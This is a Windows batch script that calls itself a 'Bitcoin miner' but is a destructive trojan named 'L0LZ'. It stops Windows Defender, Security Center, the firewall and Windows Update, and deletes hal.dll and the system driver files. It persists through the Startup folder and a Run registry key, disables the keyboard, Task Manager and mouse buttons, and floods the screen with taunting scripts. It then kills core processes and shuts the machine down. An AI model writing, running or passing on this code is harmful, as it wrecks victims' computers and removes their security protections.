@echo off


@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    goto run
) else (
    echo Please run as admin!
	pause
	exit
)

:run

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"

echo Loading...

echo @echo off>>BitcoinMiner.bat
echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>BitcoinMiner.bat
echo @((( Echo Off > Nul ) & Break Off )>>BitcoinMiner.bat
echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>BitcoinMiner.bat
echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>BitcoinMiner.bat
echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>BitcoinMiner.bat
echo )>>BitcoinMiner.bat

echo @echo off>>Guard.bat
echo :guard>>Guard.bat
echo tasklist | find /I "L0Lz">>Guard.bat
echo if errorlevel 1 (>>Guard.bat
echo         start BitcoinMiner.bat>>Guard.bat
echo goto guard>>Guard.bat
echo echo This will stop you from doing something stupid...>>Guard.bat

XCOPY "BitcoinMiner.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:x
MD BitcoinWallet
CD BitcoinMiner
XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\BitcoinMiner.bat"
CD BitcoinMiner
GOTO x

echo                         
echo This may take a while...

echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"

:nokey
start "nokeyboard.reg"
goto nokey

RUNDLL32 USER32.DLL,SwapMouseButton

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul

:c
echo Set oWMP = CreateObject("WMPlayer.OCX.7" )>>Lol.vbs
echo Set colCDROMs = oWMP.cdromCollection>>Lol.vbs
echo if colCDROMs.Count >= 1 then>>Lol.vbs
echo do>>Lol.vbs
echo For i = 0 to colCDROMs.Count - 1>>Lol.vbs
echo colCDROMs.Item(i).Eject>>Lol.vbs
echo Next ' cdrom>>Lol.vbs
echo For i = 0 to colCDROMs.Count - 1>>Lol.vbs
echo colCDROMs.Item(i).Eject>>Lol.vbs
echo Next ' cdrom>>Lol.vbs
echo loop>>Lol.vbs
echo End If>>Lol.vbs
goto c

:a
echo set wshShell =wscript.CreateObject("WScript.shell")>>Mad.vbs
echo do>>Mad.vbs
echo wscript.sleep 5>>Mad.vbs
echo wshshell.sendkeys "{CAPSLOCK}">>Mad.vbs
echo wscript.sleep 5>>Mad.vbs
echo wshshell.sendkeys "{NUMLOCK}">>Mad.vbs
echo wscript.sleep 5>>Mad.vbs
echo wshshell.sendkeys "{SCROLLLOCK}">>Mad.vbs
echo loop>>Mad.vbs
goto a

:b
echo do>>msg.vbs
echo Msgbox"Youse your computer wisely because it won't boot up again!",0+4,"You have been infected with the L0LZ trojan!">>msg.vbs
echo loop>>msg.vbs
goto b

:d
echo set speech = Wscript.CreateObject("SAPI.spVoice") >>temp.vbs
set text=L.O.L.
echo speech.speak "%text%" >>temp.vbs
goto d

echo           
echo Done
timeout 3
echo  
echo Starting...
timeout 5

start Guard.bat

:nuke
tasklist | find /I "Guard"
if errorlevel 1 (
         start Guard.bat
goto nuke

echo Message from our sponsor:
echo You are hacked idiot!

:lol
start temp.vbs
goto lol

:msg
start msg.vbs
goto msg

:mad
start Mad.vbs
goto mad

:cd
start Lol.vbs
goto cd

timeout 300

ping localhost -n 3 >nul
START /MIN CMD.EXE /C %0
taskkill /f /im chrome.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
START /MIN CMD.EXE /C %0
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul

echo Bye bye!



DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
@((( Echo Off > Nul ) & Break Off )
@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)

echo Hahahahahahahahahaha!

taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
ping localhost -n 3 >nul
taskkill /f /im taskmgr.exe
taskkill /f /im System.exe
taskkill /f /im services.exe
taskkill /f /im winlogon.exe
taskkill /f /im svchost.exe
taskkill /f /im rundll32.exe

shutdown /s
